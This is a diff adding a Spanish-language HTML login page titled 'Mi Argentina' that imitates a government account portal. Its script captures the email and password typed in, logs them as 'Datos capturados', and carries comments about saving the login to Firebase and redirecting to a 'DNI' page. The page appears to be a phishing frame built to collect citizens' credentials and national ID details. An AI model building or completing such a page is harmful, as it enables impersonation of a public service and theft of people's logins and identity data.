@@ -1,1 +1,147 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover,maximum-scale=1,user-scalable=0">
+    <title>Mi Argentina</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            font-family: -apple-system, sans-serif;
+        }
 
+        .masterContainer {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login_Container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+
+        .formContainer {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .loginForm_title {
+            color: #3730ba;
+            font-size: 24px;
+            margin-bottom: 25px;
+            font-weight: 700;
+        }
+
+        .registerForm_label {
+            display: block;
+            margin-bottom: 20px;
+        }
+
+        .registerForm_labelSpan {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .registerForm_input {
+            width: 100%;
+            padding: 12px 0;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            outline: none;
+            font-size: 16px;
+        }
+
+        .registerForm_input:focus {
+            border-bottom: 2px solid #3730ba;
+        }
+
+        .custom-button {
+            width: 100%;
+            background-color: #3730ba; /* El azul que venía en tu head */
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .custom-button:disabled {
+            background-color: #ccc;
+        }
+
+        .redirectToSignIn_link {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div id="root">
+        <div class="masterContainer">
+            <div class="login_Container">
+                <div class="registerSubContainer">
+                    <div class="formContainer">
+                        <form class="authForm" id="loginForm">
+                            <h2 class="loginForm_title">Inicia sesión</h2>
+                            
+                            <div class="loginForm_fieldContainer">
+                                <label class="registerForm_label">
+                                    <span class="registerForm_labelSpan">Correo electronico</span>
+                                    <input id="email" name="email" class="registerForm_input" type="text" required>
+                                </label>
+                            </div>
+
+                            <div class="loginForm_fieldContainer">
+                                <label class="registerForm_label">
+                                    <span class="registerForm_labelSpan">Contraseña</span>
+                                    <input id="password" name="password" class="registerForm_input" type="password" required>
+                                </label>
+                            </div>
+
+                            <div class="custom-button-container">
+                                <button type="submit" id="btnEntrar" class="custom-button">Entrar</button>
+                            </div>
+                        </form>
+                        <p style="text-align: center; margin-top: 15px;">
+                            <a class="redirectToSignIn_link" href="#">¿Olvidaste tu contraseña?</a>
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Lógica simple para habilitar el botón
+        const email = document.getElementById('email');
+        const pass = document.getElementById('password');
+        const btn = document.getElementById('btnEntrar');
+
+        [email, pass].forEach(item => {
+            item.addEventListener('input', () => {
+                btn.disabled = !(email.value.length > 3 && pass.value.length > 3);
+            });
+        });
+
+        // Aquí es donde conectarías tu Firebase para guardar el login si quisieras
+        document.getElementById('loginForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            console.log("Datos capturados:", email.value, pass.value);
+            // window.location.href = "tu-pagina-de-dni.html";
+        });
+    </script>
+</body>
+</html>
